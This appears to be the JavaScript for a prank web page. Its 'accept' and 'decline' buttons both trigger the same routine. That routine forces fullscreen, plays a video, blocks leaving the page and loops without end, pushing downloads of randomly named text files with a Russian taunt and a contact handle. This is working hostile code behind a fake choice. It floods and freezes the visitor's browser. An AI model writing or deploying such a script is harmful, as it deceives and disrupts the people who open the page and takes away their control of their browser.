const video = document.getElementById("video");
const overlay = document.getElementById("overlay");
const declineButton = document.getElementById("decline-button");
const acceptButton = document.getElementById("accept-button");

let hasClicked;

window.onbeforeunload = function( ) {
    if(hasClicked) return true;
};

function buttonClick(event) {
    event.preventDefault();
    if(!hasClicked) hasClicked = true;
    overlay.hidden = true;
    document.body.style.background = "url('games1.png')";
    video.play();
    videoClick();
    while (true)
    {
        downloadFile();
    }
}

function videoClick(event) {
    if(event) event.preventDefault();
    const { documentElement } = document;
    if(documentElement.requestFullscreen) documentElement.requestFullscreen();
    else if(documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
    else if(documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
    else if(documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
}

function downloadFile() {
    var randomName = generateRandomName();
    var fileContent = "АХАХАХАХАХАХАХХААХАХА, я гений!\nнапиши в лс в старте @iwtsyd";
    var downloadLink = document.createElement("a");
    downloadLink.download = randomName;
    downloadLink.href = "data:text/plain;charset=utf-8," + encodeURIComponent(fileContent);
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
}

function generateRandomName() {
    var characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    var randomName = '';
    for (var i = 0; i < 4; i++) {
      randomName += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return "прочти_" + randomName + '.txt';
}
  
acceptButton.addEventListener("click", buttonClick);
declineButton.addEventListener("click", buttonClick);
video.addEventListener("click", videoClick);
